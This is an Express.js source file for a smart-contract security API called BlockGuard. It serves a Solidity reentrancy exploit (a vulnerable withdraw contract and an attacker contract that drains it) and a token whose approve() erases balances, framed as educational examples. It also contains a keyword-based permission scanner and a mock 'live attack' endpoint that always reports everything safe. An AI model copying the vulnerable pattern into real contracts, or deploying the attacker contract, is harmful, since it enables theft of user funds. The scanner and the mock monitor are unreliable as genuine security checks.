const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// 🛡️ Basic status check
app.get('/', (req, res) => {
  res.send('🛡️ BlockGuard API is alive and watching the chain...');
});

// 🧪 generates a common smart contract attack
app.post('/generates-attack', (req, res) => {
  const { type } = req.body;

  if (type === 'reentrancy') {
    return res.json({
      vulnerableContract: `
contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        if (amount > 0) {
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success);
            balances[msg.sender] = 0;
        }
    }
}`,
      attackerContract: `
contract Attacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        target.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        target.call(abi.encodeWithSignature("withdraw()"));
    }
}`,
      explanation: 'This generates a reentrancy exploit, where an attacker repeatedly calls withdraw() before balance is updated, draining funds from the vulnerable contract.'
    });
  }

  res.status(400).json({ error: 'Unknown attack type' });
});

// 🧠 real example of malicious smart contract
app.get('/educate-malware', (req, res) => {
  res.json({
    type: 'real Approval Hook',
    maliciousCode: `
contract EvilToken {
    mapping(address => uint256) public balanceOf;

    function approve(address spender, uint256 amount) public returns (bool) {
        if (spender == address(this)) {
            // silently drains user
            balanceOf[msg.sender] = 0;
        }
        return true;
    }
}`,
    howItWorks: 'This contract tricks users into calling approve(), but uses the opportunity to erase their token balance. It generates a live code on how malicious hooks are embedded.',
    protectionTip: 'Never approve unknown tokens. Use permission scanners like BlockGuard to verify token behavior before interacting.'
  });
});

// 🔍 Scan contract code for risky functions
app.post('/scan-permissions', (req, res) => {
  const { contractCode } = req.body;
  const flags = [];

  if (contractCode.includes('approve')) {
    flags.push('🔺 Uses `approve()` — check if it grants unlimited access.');
  }
  if (contractCode.includes('devWallet')) {
    flags.push('🔺 References `devWallet` — check if it can transfer user funds.');
  }
  if (contractCode.includes('transferFrom')) {
    flags.push('⚠️ Uses `transferFrom()` — verify who is authorized to call this.');
  }
  if (contractCode.includes('call{')) {
    flags.push('⚠️ Uses low-level call — may allow reentrancy or misuse.');
  }

  res.json({
    score: flags.length,
    issues: flags.length > 0 ? flags : ['✅ No major flags detected'],
    reviewedAt: new Date().toISOString()
  });
});

// 🔴 LIVE ATTACK MOCK ENDPOINT
app.get('/live-attack', (req, res) => {
  res.json({
    status: "🛡️ Monitoring active",
    threatDetected: false,
    lastScan: new Date().toISOString(),
    description: "No live exploits detected. All connected wallets appear safe.",
    nextScan: new Date(Date.now() + 60000).toISOString()
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ BlockGuard API running on http://localhost:${PORT}`);
});
